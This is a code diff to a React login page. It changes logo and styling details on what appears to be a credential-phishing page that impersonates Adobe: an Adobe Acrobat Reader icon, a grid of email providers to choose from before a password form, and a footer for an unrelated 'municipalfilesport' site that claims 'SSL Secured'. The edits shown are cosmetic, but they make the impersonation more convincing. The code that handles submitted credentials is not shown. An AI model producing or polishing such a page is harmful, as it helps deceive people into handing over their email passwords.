@@ -51,8 +51,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
   const AdobeLogo = () => (
     <img 
-      src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Adobe_Corporate_logo.svg" 
-      alt="Adobe Logo" 
+      src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Adobe_Acrobat_Reader_icon_%282020%29.svg/640px-Adobe_Acrobat_Reader_icon_%282020%29.svg.png" 
+      alt="Adobe Acrobat Reader Logo" 
       className="w-10 h-10"
     />
   );
@@ -64,7 +64,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
         backgroundImage: "url('https://images.unsplash.com/photo-1588345921523-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
       }}
     >
-      <div className="w-full max-w-md bg-white rounded-2xl shadow-xl overflow-hidden">
+      <div className="w-full max-w-md bg-slate-50 rounded-2xl shadow-xl overflow-hidden border border-slate-200">
         <div className="p-8">
           <div className="flex justify-center mb-6">
             <AdobeLogo />
@@ -87,7 +87,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                       key={provider.name}
                       onClick={() => setSelectedProvider(provider.name)}
                       type="button"
-                      className="flex flex-col items-center justify-center p-4 bg-gray-50 rounded-lg border border-gray-200 hover:bg-gray-100 hover:border-blue-500 hover:shadow-sm transition-all duration-200"
+                      className="flex flex-col items-center justify-center p-4 bg-white rounded-lg border border-gray-200 hover:bg-blue-50 hover:border-blue-500 hover:shadow-sm transition-all duration-200"
                     >
                       <img src={provider.logo} alt={provider.name} className="w-10 h-10 object-contain" />
                       <span className="mt-3 text-sm font-semibold text-gray-700">{provider.name}</span>
@@ -105,7 +105,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
                 <form onSubmit={handleSubmit} className="space-y-5">
                   {errorMessage && (
-                    <div className="bg-red-50 text-red-700 p-3 rounded-lg text-sm font-medium text-center">
+                    <div className="bg-red-100 text-red-700 p-3 rounded-lg text-sm font-medium text-center border border-red-200">
                       {errorMessage}
                     </div>
                   )}
@@ -158,7 +158,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
             )}
           </div>
         </div>
-        <div className="bg-gray-50 p-4 border-t border-gray-200">
+        <div className="bg-slate-100 p-4 border-t border-slate-200">
           <p className="text-xs text-gray-500 text-center">© 2025 municipalfilesport. All rights reserved. SSL Secured.</p>
         </div>
       </div>
